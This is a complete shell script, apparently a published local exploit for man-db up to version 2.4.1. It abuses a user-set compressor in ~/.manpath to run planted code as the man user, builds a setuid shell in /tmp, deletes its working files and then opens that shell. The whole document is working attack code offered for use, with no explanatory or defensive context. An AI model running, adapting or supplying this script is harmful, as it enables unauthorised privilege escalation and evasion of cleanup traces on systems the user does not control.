MANBIN=/usr/bin/man
MANDIR=man_x
TMPDIR=/tmp
echo "man-db[v2.4.1-]: local uid=man exploit."
echo -e "by: vade79/v9 v9@fakehalo.deadpig.org (fakehalo)\n"
if [ ! "`$MANBIN -V 2>/dev/null`" ]
then
 echo "[!] \"$MANBIN\" does not appear to be man-db, failed."
 exit
fi
umask 002
cd $TMPDIR
echo "[*] making fake manpage directories/files..."
mkdir $MANDIR ${MANDIR}/man1 ${MANDIR}/cat1
touch ${MANDIR}/man1/x.1
echo "[*] making runme, and mansh source files..."
cat <<EOF>runme.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
int main(int argc,char **argv){
 setreuid(geteuid(),geteuid());
 system("cc ${TMPDIR}/mansh.c -o ${TMPDIR}/mansh");
 chmod("${TMPDIR}/mansh",S_ISUID|S_IRUSR|S_IWUSR|S_IXUSR|S_IXGRP);
 unlink(argv[0]);
 exit(0);
}
EOF

cat <<EOF>mansh.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(){
 setreuid(geteuid(),geteuid());
 execl("/bin/sh","sh",0);
 exit(0);
}
EOF

echo "[*] compiling runme source..."
cc runme.c -o runme
echo "[*] setting \"compressor\" to: ${TMPDIR}/runme..."
echo "DEFINE compressor ${TMPDIR}/runme">~/.manpath
echo "[*] executing man-db/man..."
$MANBIN -M ${TMPDIR}/$MANDIR -P /bin/true x 1>/dev/null 2>&1
echo "[*] cleaning up files..."
rm -rf $MANDIR mansh.c runme.c runme ~/.manpath
if test -u "${TMPDIR}/mansh"
then
echo "[*] success, entering shell."
ls -l ${TMPDIR}/mansh
${TMPDIR}/mansh
else
echo "[!] exploit failed."
rm -rf ${TMPDIR}/mansh
fi
exit
